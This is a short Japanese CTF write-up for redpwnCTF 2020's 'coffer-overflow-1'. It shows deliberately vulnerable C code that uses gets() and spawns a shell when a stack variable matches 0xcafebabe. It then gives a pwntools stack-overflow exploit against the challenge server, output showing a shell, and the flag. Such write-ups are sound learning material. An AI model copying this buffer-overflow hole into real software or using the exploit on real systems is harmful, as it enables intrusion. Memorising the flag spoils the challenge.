# coffer-overflow-1

> The coffers keep getting stronger! You'll need to use the source, Luke.

coffer-overflow-1.c, coffer-overflow-1というファイルが添付されていた。

## solution

coffer-overflow-1.cの内容は以下の通り

```c
#include <stdio.h>
#include <string.h>

int main(void)
{
  long code = 0;
  char name[16];

  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  setbuf(stderr, NULL);

  puts("Welcome to coffer overflow, where our coffers are overfilling with bytes ;)");
  puts("What do you want to fill your coffer with?");

  gets(name);

  if(code == 0xcafebabe) {
    system("/bin/sh");
  }
}
```

codeの値を`0xcafebabe`に書き換えるだけで良い。

coffer-overflow-0よりnameとcodeは24バイト離れていることがわかっているので適当な文字を24バイトの後に`0xcafebabe`を入力してやるとcodeが`0xcafebabe`に書き換わる。

```python
from pwn import *

#p = process('./coffer-overflow-1')
p = remote('2020.redpwnc.tf', 31255)

payload = b'A' * 24
payload += p32(0xcafebabe)

p.sendline(payload)
p.interactive()
```

```
$ python solve.py
[+] Opening connection to 2020.redpwnc.tf on port 31255: Done
[*] Switching to interactive mode
Welcome to coffer overflow, where our coffers are overfilling with bytes ;)
What do you want to fill your coffer with?
$ ls
Makefile
bin
coffer-overflow-1
coffer-overflow-1.c
dev
flag.txt
lib
lib32
lib64
$ cat flag.txt
flag{th1s_0ne_wasnt_pure_gu3ssing_1_h0pe}
```

